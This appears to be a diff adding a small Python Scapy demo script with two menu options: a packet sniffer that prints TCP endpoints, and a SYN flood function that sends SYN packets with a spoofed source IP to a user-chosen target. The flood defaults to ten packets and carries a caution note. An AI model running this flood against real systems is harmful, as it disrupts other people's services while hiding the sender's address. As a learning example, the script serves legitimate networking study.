@@ -1,0 +1,33 @@
+from scapy.all import sniff, IP, TCP, send
+
+def packet_callback(packet):
+    if IP in packet and TCP in packet:
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        src_port = packet[TCP].sport
+        dst_port = packet[TCP].dport
+        print(f"Received TCP packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")
+        # You can perform more advanced analysis or manipulation here
+
+def simple_syn_flood(target_ip, target_port, count=10):
+    for i in range(count):
+        ip_layer = IP(src="1.2.3.4", dst=target_ip) # Spoofed source IP
+        tcp_layer = TCP(sport=12345, dport=target_port, flags="S") # SYN flag
+        packet = ip_layer / tcp_layer
+        send(packet, verbose=0)
+    print(f"Sent {count} SYN packets to {target_ip}:{target_port}")
+
+if __name__ == "__main__":
+    print("Scapy examples:")
+    print("1. Simple Packet Sniffing")
+    print("2. Send Simple SYN Flood (Use with caution and only on your own network)")
+    choice = input("Enter your choice (1 or 2): ")
+
+    if choice == '1':
+        sniff(prn=packet_callback, store=0, count=10) # Sniff 10 packets
+    elif choice == '2':
+        target_ip = input("Enter target IP address: ")
+        target_port = int(input("Enter target port: "))
+        simple_syn_flood(target_ip, target_port)
+    else:
+        print("Invalid choice.")
